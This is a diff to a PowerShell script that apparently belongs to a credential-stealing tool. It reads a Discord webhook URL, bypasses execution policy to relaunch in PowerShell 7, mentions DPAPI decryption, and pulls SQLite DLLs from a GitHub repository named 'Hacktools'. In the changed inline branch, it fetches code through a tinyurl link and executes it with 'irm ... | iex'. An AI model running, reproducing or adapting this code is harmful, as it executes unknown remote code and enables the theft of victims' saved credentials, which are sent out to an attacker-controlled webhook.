@@ -1,13 +1,5 @@
 # Get webhook URL from environment variable
-$WebhookUrl = $env:DISCORD_WEBHOOK_URL
-
-if ([string]::IsNullOrEmpty($webhookUrl)) {
-    Write-Error "No webhook URL set. Exiting."
-    if ($Host.Name -match 'ConsoleHost') {
-        Read-Host "Press Enter to exit"
-    }
-    exit 1
-}
+$webhookUrl = $env:DISCORD_WEBHOOK_URL
 
 if ([string]::IsNullOrEmpty($webhookUrl)) {
     Write-Error "No webhook URL set. Exiting."
@@ -26,19 +18,19 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
         Write-Host "Restarting script in PowerShell 7 ($pwshPath)..."
 
         if ($PSCommandPath) {
-            # If running from a script file, restart with -File
+            # Running from a script file, restart with -File
             & $pwshPath -NoProfile -ExecutionPolicy Bypass -File $PSCommandPath @args
         }
         else {
-            # If running from Run box or no script file, restart with inline commands
-            $script = {
-                # Insert your main script commands here, example:
-                $env:DISCORD_WEBHOOK_URL = $webhookUrl
-                $db = ''
-                irm https://tinyurl.com/y9ezd7ay | iex
-                Read-Host "Press Enter to exit"
-            }
-            & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit -Command $script
+            # Running from Run box or no script file, restart with inline commands as a string
+            $inlineScript = @"
+`$env:DISCORD_WEBHOOK_URL = '$webhookUrl'
+`$db = ''
+irm https://tinyurl.com/y9ezd7ay | iex
+Read-Host 'Press Enter to exit'
+"@
+
+            & $pwshPath -NoProfile -ExecutionPolicy Bypass -NoExit -Command $inlineScript
         }
 
         exit
@@ -48,6 +40,7 @@ if ($PSVersionTable.PSVersion.Major -lt 7) {
         # Continue running script in PS5 but only DPAPI decryption will be used
     }
 }
+
 
 # URLs for SQLite DLLs (64-bit)
 $sqliteInteropUrl = "https://github.com/BlueJuice1/Hacktools/releases/download/V1.0/SQLite.Interop.dll"
